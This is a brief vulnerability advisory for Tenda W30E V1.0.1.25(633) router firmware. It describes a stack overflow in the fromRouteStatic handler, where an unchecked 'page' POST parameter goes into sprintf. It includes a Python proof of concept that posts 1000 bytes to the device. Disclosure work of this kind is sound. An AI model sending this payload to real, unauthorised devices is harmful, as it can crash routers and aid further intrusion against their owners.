## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2218.html

## Affected version

W30Ev1.0 V1.0.1.25(633)

## Vulnerability details

The Tenda W30Ev1.0 V1.0.1.25(633) firmware has a stack overflow vulnerability in the `fromRouteStatic` function. The `v6` variable receives the `page` parameter from a POST request and is used in statement `v1 = sprintf(s, "routing_static.asp?page=%s", v6);`, which caused the buffer overflow attack.

![image-20240409111025706](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240409111025706.png)

The user-provided `page` can trigger this security vulnerability.

## POC

```python
import requests

IP = "192.168.84.101"
url = f"http://{IP}/goform/fromRouteStatic"
payload = b'a'*1000
data = {"page": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240409110959426](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240409110959426.png)